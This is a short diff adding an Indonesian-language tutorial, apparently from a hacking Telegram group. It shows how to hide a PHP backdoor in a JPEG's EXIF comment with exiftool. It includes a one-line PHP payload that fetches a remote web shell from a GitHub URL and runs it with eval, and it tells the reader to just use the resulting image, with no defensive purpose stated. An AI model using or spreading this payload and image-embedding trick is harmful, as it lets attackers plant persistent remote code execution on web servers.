@@ -1,0 +1,12 @@
+pkg update && pkg upgrade
+pkg install exiftool -y
+
+Contoh script backdor nya:
+<?php eval('?>'.file_get_contents('https://raw.githubusercontent.com/0xr4peed/TR5f-Shell/refs/heads/main/src/cache.php'));
+
+exiftool -Comment="<?php Masikin di sini); /*" -o - mbak.jpg | { cat; printf "*/"; } > backdor.jpg
+
+lalu beres deh tinggal lu pakek
+
+btw jangan lupa join telegram kita agar kita saling berbagi ilmu!
+( @dof_bitcher )
